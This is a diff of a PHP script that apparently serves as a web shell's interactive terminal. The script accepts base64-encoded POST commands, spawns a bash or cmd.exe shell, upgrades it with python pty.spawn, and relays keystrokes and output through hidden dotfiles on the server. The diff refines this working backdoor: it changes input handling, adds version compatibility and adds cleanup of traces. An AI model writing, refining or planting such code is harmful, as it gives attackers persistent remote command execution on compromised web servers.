@@ -5,15 +5,10 @@
 @ini_set('max_execution_time', 0);
 @error_reporting(0);
 
-$work_dir = getcwd();
-$queue_dir = $work_dir . '/.queue';
-$out_file = $work_dir . '/.output.txt';
-$pid_file = $work_dir . '/.pid.txt';
-
-// Ensure queue directory exists cleanly
-if (!file_exists($queue_dir)) {
-    @mkdir($queue_dir, 0777, true);
-}
+$work_dir   = getcwd();
+$input_file = $work_dir . '/.input.txt';
+$out_file   = $work_dir . '/.output.txt';
+$pid_file   = $work_dir . '/.pid.txt';
 
 function getSafeStr($str){
     if (function_exists("mb_convert_encoding")) {
@@ -45,23 +40,25 @@ function finish() {
     }
 }
 
-$type = base64_decode($_POST['z0']);
-$z1 = base64_decode($_POST['z1']);
+function compat_clearstatcache($file) {
+    if (version_compare(PHP_VERSION, '5.3.0', '>=')) {
+        clearstatcache(true, $file);
+    } else {
+        clearstatcache();
+    }
+}
+
+$type = isset($_POST['z0']) ? base64_decode($_POST['z0']) : '';
+$z1   = isset($_POST['z1']) ? base64_decode($_POST['z1']) : '';
 
 $result = array("status" => "fail", "msg" => "");
 
 if ($type == "create") {
-    // Purge old queue left behind from dead instances
-    if (is_dir($queue_dir)) {
-        foreach (glob($queue_dir . '/*.txt') as $old_file) {
-            @unlink($old_file);
-        }
-    }
-    
+    @unlink($input_file);
     file_put_contents($out_file, '');
     file_put_contents($pid_file, 'running');
 
-    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
+    $win   = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
     $shell = $z1 ? $z1 : ($win ? "cmd.exe" : "/bin/bash");
 
     $descriptorspec = array(
@@ -72,7 +69,7 @@ if ($type == "create") {
 
     if ($win) {
         $outputfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "out_" . rand() . ".txt";
-        $errorfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "err_" . rand() . ".txt";
+        $errorfile  = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "err_" . rand() . ".txt";
         
         @file_put_contents($outputfile, '');
         @file_put_contents($errorfile, '');
@@ -93,55 +90,61 @@ if ($type == "create") {
     if ($win) {
         stream_set_blocking($pipes[0], 1); 
         $reader = fopen($outputfile, "r+");
-        $error = fopen($errorfile, "r+");
+        $error  = fopen($errorfile, "r+");
     } else {
         stream_set_blocking($pipes[0], 0);
         stream_set_blocking($pipes[1], 0);
         stream_set_blocking($pipes[2], 0);
         $reader = $pipes[1];
-        $error = $pipes[2];
+        $error  = $pipes[2];
         
-        $python_cmd = "python3 -c 'import pty; pty.spawn(\"$shell\")'";
-        fwrite($pipes[0], "which python3 >/dev/null 2>&1 && exec $python_cmd || exec python -c 'import pty; pty.spawn(\"$shell\")'\n");
+        $python_cmd   = "python3 -c 'import pty; pty.spawn(\"$shell\")'";
+        $spawn_script = "which python3 >/dev/null 2>&1 && exec $python_cmd || exec python -c 'import pty; pty.spawn(\"$shell\")'";
+        
+        fwrite($pipes[0], "$spawn_script\n");
         fflush($pipes[0]);
-        
         usleep(100000); 
+
+        fwrite($pipes[0], "stty -echo\n");
+        fflush($pipes[0]);
+        usleep(50000);
+
+        while (($chunk = fread($reader, 10240)) !== false && $chunk !== "") {}
+        while (($err_chunk = fread($error, 10240)) !== false && $err_chunk !== "") {}
     }
 
     $result["status"] = "success";
-    $result["msg"] = "Engine spawned in background execution state.";
+    $result["msg"]    = "Engine spawned in background execution state.";
     echo json_encode($result);
     finish(); 
 
-    // Cross-platform console loop
     $idle = 0;
     while ($idle < 1000000) {
-        clearstatcache(true, $pid_file);
+        compat_clearstatcache($pid_file);
         if (!file_exists($pid_file) || file_get_contents($pid_file) !== 'running') {
             break;
         }
 
-        // Transitional queue processing (avoid high-speed input typing)
-        $files = glob($queue_dir . '/*.txt');
-        if (!empty($files)) {
-            // Sort files alphabetically to ensure strict execution order matching timestamps
-            sort($files);
-            $idle = 0;
-
-            foreach ($files as $file) {
-                $writeBuffer = @file_get_contents($file);
-                @unlink($file); // Remove transactional chunk instantly
+        if (file_exists($input_file) && filesize($input_file) > 0) {
+            $fp = fopen($input_file, 'r+');
+            if ($fp && flock($fp, LOCK_EX)) {
+                $writeBuffer = stream_get_contents($fp);
+                ftruncate($fp, 0);
+                fflush($fp);
+                flock($fp, LOCK_UN);
+                fclose($fp);
 
                 if ($writeBuffer !== false && strlen($writeBuffer) > 0) {
                     fwrite($pipes[0], $writeBuffer);
                     fflush($pipes[0]);
+                    $idle = 0;
+                    usleep(1000);
                 }
             }
         } else {
             $idle++;
         }
 
-        // stdout stream reader and convertor
         $output = "";
         while (($chunk = fread($reader, 10240)) !== false && $chunk !== "") {
             $output .= $chunk;
@@ -154,7 +157,6 @@ if ($type == "create") {
             @ftruncate($reader, 0);
         }
 
-        // stderr stream reader and convertor
         $errput = "";
         while (($err_chunk = fread($error, 10240)) !== false && $err_chunk !== "") {
             $errput .= $err_chunk;
@@ -167,7 +169,6 @@ if ($type == "create") {
             @ftruncate($error, 0);
         }
 
-        // resize
         $resize_file = $work_dir . '/.resize.txt';
         if (file_exists($resize_file)) {
             $resize = explode(':', @file_get_contents($resize_file));
@@ -186,7 +187,6 @@ if ($type == "create") {
             break;
         }
 
-        // Keep loop time highly reactive for responsive terminal typing
         usleep(15000); 
     }
 
@@ -197,6 +197,7 @@ if ($type == "create") {
     @proc_close($process);
     
     @unlink($pid_file);
+    @unlink($input_file);
     if ($win) {
         @unlink($outputfile);
         @unlink($errorfile);
@@ -209,19 +210,16 @@ else if ($type == "write") {
         $rawBytes = $z1; 
     }
 
-    // Write keystrokes to completely unique isolated file chunks.
-    // High-resolution microtime ensures perfect chronologically sorted filenames.
-    $chunk_file = $queue_dir . '/' . sprintf("%015.4f", microtime(true)) . '_' . rand(1000, 9999) . '.txt';
-    file_put_contents($chunk_file, $rawBytes, LOCK_EX);
+    file_put_contents($input_file, $rawBytes, FILE_APPEND | LOCK_EX);
     
     $result["status"] = "success";
-    $result["msg"] = "Input buffer queued.";
+    $result["msg"]    = "Input buffer queued.";
     echo json_encode($result);
 } 
 
 else if ($type == "read") {
     $readContent = '';
-    clearstatcache(true, $out_file);
+    compat_clearstatcache($out_file);
     
     if (file_exists($out_file) && filesize($out_file) > 0) {
         $fp = fopen($out_file, 'r+');
@@ -235,42 +233,57 @@ else if ($type == "read") {
     }
 
     $result["status"] = "success";
-    $result["msg"] = base64_encode($readContent);
+    $result["msg"]    = base64_encode($readContent);
     echo json_encode($result);
 }
 
 else if ($type == "resize") {
-    $cols = base64_decode($_POST['z1']);
-    $rows = base64_decode($_POST['z2']);
+    $cols = isset($_POST['z1']) ? base64_decode($_POST['z1']) : 0;
+    $rows = isset($_POST['z2']) ? base64_decode($_POST['z2']) : 0;
 
     if ($cols <= 0 || $rows <= 0) {
         $result['status'] = 'error';
-        $result['msg'] = base64_encode('Invalid dimensions.');
-
+        $result['msg']    = base64_encode('Invalid dimensions.');
         echo json_encode($result);
-
         exit;
     }
 
     $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
     if ($win) {
         $cmd = "mode con: cols=$cols lines=$rows && cls\r\n";
-        $chunk_file = $queue_dir . '/' . sprintf("%015.4f", microtime(true)) . '_' . rand(1000, 9999) . '.txt';
-        file_put_contents($chunk_file, $cmd, LOCK_EX);
+        file_put_contents($input_file, $cmd, FILE_APPEND | LOCK_EX);
     } else {
         file_put_contents($work_dir . '/.resize.txt', "$rows:$cols");
     }
 
     $result['status'] = 'success';
-    $result['msg'] = base64_encode('Dimensions are updated');
-
+    $result['msg']    = base64_encode('Dimensions are updated');
     echo json_encode($result);
 }
 
 else if ($type == "stop") {
     file_put_contents($pid_file, 'stopped');
+
+    @unlink($input_file);
+    $resize_file = $work_dir . '/.resize.txt';
+    if (file_exists($resize_file)) {
+        @unlink($resize_file);
+    }
+
+    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
+        foreach (glob(sys_get_temp_dir() . '/out_*.txt') as $tmp_out) {
+            @unlink($tmp_out);
+        }
+        foreach (glob(sys_get_temp_dir() . '/err_*.txt') as $tmp_err) {
+            @unlink($tmp_err);
+        }
+    }
+
+    usleep(50000);
+    @unlink($pid_file);
+
     $result["status"] = "stop";
-    $result["msg"] = base64_encode("Engine shutdown initiated.");
+    $result["msg"]    = base64_encode("Engine shutdown initiated and resources cleaned.");
     echo json_encode($result);
 }
 
